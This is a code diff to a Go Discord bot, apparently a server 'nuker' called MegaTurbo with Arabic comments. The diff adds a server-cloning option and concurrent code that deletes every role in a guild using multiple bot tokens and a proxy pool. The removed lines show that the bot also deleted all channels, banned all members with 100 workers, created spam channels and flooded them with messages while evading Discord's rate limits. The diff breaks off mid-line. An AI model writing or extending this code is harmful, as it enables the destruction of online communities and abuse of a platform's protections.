@@ -10,6 +10,7 @@ import (
 	"net/url"
 	"os"
 	"os/signal"
+	"sort"
 	"strings"
 	"sync"
 	"syscall"
@@ -65,12 +66,12 @@ func main() {
 	cmdNuke := "megaturbo"
 	commandNuke := &discordgo.ApplicationCommand{
 		Name:        cmdNuke,
-		Description: "Massive Auto-Filtered Proxy Turbo Engine",
+		Description: "Massive Auto-Filtered Proxy Turbo Engine + Cloner",
 		Options: []*discordgo.ApplicationCommandOption{
 			{
 				Type:        discordgo.ApplicationCommandOptionString,
 				Name:        "room_name",
-				Description: "اسم الرومات",
+				Description: "اسم الرومات (لو ما بتستخدم نسخ سيرفر)",
 				Required:    true,
 			},
 			{
@@ -97,6 +98,12 @@ func main() {
 				Description: "التوكنات مفصولة بفاصلة (,)",
 				Required:    true,
 			},
+			{
+				Type:        discordgo.ApplicationCommandOptionString,
+				Name:        "template_guild_id",
+				Description: "(اختياري) إيدي السيرفر المراد نسخ روماته ورتبه",
+				Required:    false,
+			},
 		},
 	}
 
@@ -120,7 +127,7 @@ func main() {
 			s.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
 				Type: discordgo.InteractionResponseChannelMessageWithSource,
 				Data: &discordgo.InteractionResponseData{
-					Content: "🚀 تم تفعيل المحرك الخارق المعدل لتجاوز حدود الرسائل...",
+					Content: "🚀 تم تفعيل المحرك الخارق مع نظام نسخ السيرفرات...",
 					Flags:   discordgo.MessageFlagsEphemeral,
 				},
 			})
@@ -136,6 +143,11 @@ func main() {
 			messagesCount := int(optionMap["messages_count"].IntValue())
 			tokensInput := optionMap["bot_tokens"].StringValue()
 			
+			templateGuildID := ""
+			if opt, ok := optionMap["template_guild_id"]; ok {
+				templateGuildID = opt.StringValue()
+			}
+			
 			var tokens []string
 			for _, t := range strings.Split(tokensInput, ",") {
 				t = strings.TrimSpace(t)
@@ -147,7 +159,7 @@ func main() {
 			guildID := i.GuildID
 			botID := s.State.User.ID
 
-			go executeMegaTurboNuke(tokens, massiveProxyPool, guildID, botID, roomName, roomsCount, messageContent, messagesCount, s)
+			go executeMegaTurboNuke(tokens, massiveProxyPool, guildID, botID, roomName, roomsCount, messageContent, messagesCount, templateGuildID, s)
 		}
 	})
 
@@ -158,7 +170,7 @@ func main() {
 	}
 
 	_, _ = sess.ApplicationCommandCreate(sess.State.User.ID, "", commandNuke)
-	fmt.Println("⚡ بوت MegaTurbo يعمل بأقصى كفاءة لتجاوز الـ Rate Limit!")
+	fmt.Println("⚡ بوت MegaTurbo يعمل بأقصى كفاءة لتجاوز الـ Rate Limit ومع ميزة النسخ!")
 
 	stop := make(chan os.Signal, 1)
 	signal.Notify(stop, syscall.SIGINT, syscall.SIGTERM, os.Interrupt)
@@ -208,7 +220,7 @@ func filterActiveProxies(rawProxies []string) []*http.Client {
 	return activeClients
 }
 
-func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, roomName string, roomsCount int, messageContent string, messagesCount int, s *discordgo.Session) {
+func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, roomName string, roomsCount int, messageContent string, messagesCount int, templateGuildID string, s *discordgo.Session) {
 	if len(tokens) == 0 {
 		return
 	}
@@ -219,15 +231,6 @@ func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, 
 	}
 
 	botIDs := map[string]bool{botID: true}
-
-	channelPayloads := make([][]byte, roomsCount)
-	for i := 0; i < roomsCount; i++ {
-		p, _ := json.Marshal(map[string]interface{}{
-			"name": fmt.Sprintf("%s-%d", roomName, i),
-			"type": 0,
-		})
-		channelPayloads[i] = p
-	}
 
 	msgPayload, _ := json.Marshal(map[string]string{"content": messageContent})
 
@@ -261,6 +264,32 @@ func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, 
 		}
 	}
 
+	roles, err := s.GuildRoles(guildID)
+	if err == nil {
+		var wgRole sync.WaitGroup
+		for _, r := range roles {
+			if !r.Managed && r.Name != "@everyone" {
+				wgRole.Add(1)
+				go func(rID string) {
+					defer wgRole.Done()
+					for idx, t := range tokens {
+						client := clients[idx%len(clients)]
+						req, _ := http.NewRequest("DELETE", fmt.Sprintf("https://discord.com/api/v10/guilds/%s/roles/%s", guildID, rID), nil)
+						req.Header.Set("Authorization", "Bot "+t)
+						resp, err := client.Do(req)
+						if err == nil {
+							resp.Body.Close()
+							if resp.StatusCode != 429 {
+								break
+							}
+						}
+					}
+				}(r.ID)
+			}
+		}
+		wgRole.Wait()
+	}
+
 	makeMegaRequest := func(method, urlStr string, body []byte, index int) bool {
 		client := clients[index%len(clients)]
 		token := tokens[index%len(tokens)]
@@ -282,7 +311,6 @@ func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, 
 
 			if resp.StatusCode == 429 {
 				resp.Body.Close()
-				// مهلة أذكى لتجنب إيقاف الروم عند الرسائل الكثيرة
 				time.Sleep(50 * time.Millisecond)
 				continue
 			}
@@ -295,115 +323,4 @@ func executeMegaTurboNuke(tokens []string, rawProxies []string, guildID, botID, 
 
 	// 1. حذف الرومات القديمة
 	chQueue := make(chan string, len(oldChannelIDs))
-	for _, id := range oldChannelIDs {
-		chQueue <- id
-	}
-	close(chQueue)
-
-	var wgDel sync.WaitGroup
-	for w := 0; w < 60; w++ {
-		wgDel.Add(1)
-		go func(workerID int) {
-			defer wgDel.Done()
-			for chID := range chQueue {
-				makeMegaRequest("DELETE", "https://discord.com/api/v10/channels/"+chID, nil, workerID)
-			}
-		}(w)
-	}
-	wgDel.Wait()
-
-	// 2. باند الأعضاء بأقصى سرعة
-	if len(allUserIDs) > 0 {
-		userQueue := make(chan string, len(allUserIDs))
-		for _, uid := range allUserIDs {
-			userQueue <- uid
-		}
-		close(userQueue)
-
-		var wgBan sync.WaitGroup
-		banWorkers := 100
-		for w := 0; w < banWorkers; w++ {
-			wgBan.Add(1)
-			go func(workerID int) {
-				defer wgBan.Done()
-				for uid := range userQueue {
-					banURL := fmt.Sprintf("https://discord.com/api/v10/guilds/%s/bans/%s", guildID, uid)
-					makeMegaRequest("PUT", banURL, nil, workerID)
-				}
-			}(w)
-		}
-		wgBan.Wait()
-	}
-
-	// 3. إنشاء الرومات الجديدة
-	roomChan := make(chan struct {
-		Payload []byte
-		Index   int
-	}, len(channelPayloads))
-
-	for idx, p := range channelPayloads {
-		roomChan <- struct {
-			Payload []byte
-			Index   int
-		}{p, idx}
-	}
-	close(roomChan)
-
-	var newChannelIDs []string
-	var muChannels sync.Mutex
-	var wgCreate sync.WaitGroup
-
-	for w := 0; w < 50; w++ {
-		wgCreate.Add(1)
-		go func(workerID int) {
-			defer wgCreate.Done()
-			client := clients[workerID%len(clients)]
-			token := tokens[workerID%len(tokens)]
-
-			for item := range roomChan {
-				req, _ := http.NewRequest("POST", "https://discord.com/api/v10/guilds/"+guildID+"/channels", bytes.NewBuffer(item.Payload))
-				req.Header.Set("Authorization", "Bot "+token)
-				req.Header.Set("Content-Type", "application/json")
-				req.Header.Set("User-Agent", "DiscordBot (https://discord.com, v10)")
-
-				resp, err := client.Do(req)
-				if err != nil {
-					continue
-				}
-
-				if resp.StatusCode == 200 || resp.StatusCode == 201 {
-					var chResult map[string]interface{}
-					if json.NewDecoder(resp.Body).Decode(&chResult) == nil {
-						if chID, ok := chResult["id"].(string); ok {
-							muChannels.Lock()
-							newChannelIDs = append(newChannelIDs, chID)
-							muChannels.Unlock()
-						}
-					}
-				}
-				resp.Body.Close()
-			}
-		}(w)
-	}
-	wgCreate.Wait()
-
-	// 4. إرسال الرسائل (معدل بحيث يوزع الطلبات بذكاء ولا يوقف عند 35 رسالة)
-	if len(newChannelIDs) > 0 && messagesCount > 0 {
-		var wgMsg sync.WaitGroup
-		// توزيع العمل لكل روم بشكل مستقل لمنع لمتد ديسكورد للروم الواحد
-		for i, chID := range newChannelIDs {
-			wgMsg.Add(1)
-			go func(channelID string, workerIndex int) {
-				defer wgMsg.Done()
-				for m := 0; m < messagesCount; m++ {
-					success := makeMegaRequest("POST", "https://discord.com/api/v10/channels/"+channelID+"/messages", msgPayload, workerIndex+m)
-					if !success {
-						// استراحة قصيرة جداً جداً لو واجه حماية بالروم ثم إكمال الفلو
-						time.Sleep(10 * time.Millisecond)
-					}
-				}
-			}(chID, i)
-		}
-		wgMsg.Wait()
-	}
-}
+	for _, id := range old
